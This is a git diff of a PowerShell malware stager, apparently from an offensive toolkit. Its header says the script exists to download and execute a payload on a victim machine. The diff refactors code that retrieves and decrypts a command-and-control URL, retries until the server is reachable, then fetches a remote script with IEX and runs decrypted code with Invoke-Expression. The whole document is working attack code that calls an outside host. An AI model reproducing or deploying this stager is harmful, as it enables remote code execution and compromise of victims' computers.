@@ -1,6 +1,6 @@
 # Agent_pnt.ps1 - by @thebenygreen - @eyesopensec
-# This file is generated as pntx.ps1 by the Generator and can be renammed. its only purpose in to run download and execute PAYLOAD on victim machine. 
-# It retreive C2 URL stored in a web page over Internet and start unencryption and Downexec process
+# This file is generated as pntx.ps1 by the Generator and can be renammed. its only purpose is to download and execute PAYLOAD on victim machine. 
+# It retreive and decrypt C2 URL stored in a web page over Internet and Downexec process
 ###############################################################################################################################
 
 $keyreadgetC2 = "KEYTOREADGETC2"
@@ -81,30 +81,36 @@ function TestURLstatus {
 	}
 	$HTTP_Response.Close()
 }
-$t = TestInternet
-if ($t -eq $True) {
- # Test internet connexion. If TRUE, retreive actual c2 URL, decrypt it and test that URL. if URL is broken, sleep and test until connexion get back
-	$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") # Retreive and decrypt actual C2 URL at each execution
+# Download, Decrypt and execute Agent 
+function RunAgent {
+	IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pntx.ps1"))
+	$decrypted = de PASSCRYPT SALT
+	Invoke-Expression $decrypted
+	}
+# Retreive and decrypt actual C2 URL at each execution
+function RetreiveC2Url {
+	$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") 
 	[string] $Global:c2c = Decrypt-String $keyreadgetC2 $c2cEncrypted 
 	$uconnect = TestURLstatus -URL $c2c
+	}
+$t = TestInternet
+
+if ($t -eq $True) {
+ # Test internet connexion. If TRUE, retreive actual c2 URL, decrypt it and test that URL. if URL is broken, sleep and test until connexion get back
+	RetreiveC2Url
 		if ($uconnect -eq $True) { # test URL of c2, if TRUE, run PAYLOAD
-			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pntx.ps1"))
-			$decrypted = de PASSCRYPT SALT
-			Invoke-Expression $decrypted	
+			RunAgent	
 		}
 		else{ # if URL is broken, sleep and test until URL become active 
 			while ($uconnect -eq $False) { 
-				$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") # Retreive good C2 URL at each execution
-				[string] $Global:c2c = Decrypt-String $keyreadgetC2 $c2cEncrypted
-				$uconnect = TestURLstatus -URL $c2c
+				# Retreive good C2 URL at each execution
+				RetreiveC2Url
 				Start-Sleep -Seconds 10 
 				if ($uconnect -eq $True) {				
 					break
 				}
 			} # Once URL become active again, run PAYLOAD
-			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pntx.ps1"))
-			$decrypted = de PASSCRYPT SALT
-			Invoke-Expression $decrypted			
+			RunAgent			
 		}		
 	}
 else { # Test internet connexion. If FALSE, try until connexion are UP and retreive actual c2 URL, decrypt it and test that URL. if URL is broken, sleep and test until connexion get back
@@ -115,26 +121,20 @@ else { # Test internet connexion. If FALSE, try until connexion are UP and retre
 			break
 		}
 	}
-	$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") # Retreive good C2 URL and each execution
-	[string] $Global:c2c = Decrypt-String $keyreadgetC2 $c2cEncrypted 
-	$uconnect = TestURLstatus -URL $c2c
+	# Retreive good C2 URL at each execution
+	RetreiveC2Url
 		if ($uconnect -eq $True) { # test URL c2
-			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pntx.ps1"))
-			$decrypted = de PASSCRYPT SALT
-			Invoke-Expression $decrypted	
+			RunAgent
 		}
 		else{
 			while ($uconnect -eq $False) { #check internet connexion before continue (wait until internet is up)
-				$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") # Retreive good C2 URL and each execution
-				[string] $Global:c2c = Decrypt-String $keyreadgetC2 $c2cEncrypted 
-				$uconnect = TestURLstatus -URL $c2c
+				# Retreive good C2 URL and each execution
+				RetreiveC2Url
 				Start-Sleep -Seconds 10 
 				if ($uconnect -eq $True) {				
 					break
 				}
 			}
-			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pntx.ps1"))
-			$decrypted = de PASSCRYPT SALT
-			Invoke-Expression $decrypted			
+			RunAgent			
 		}	
 }
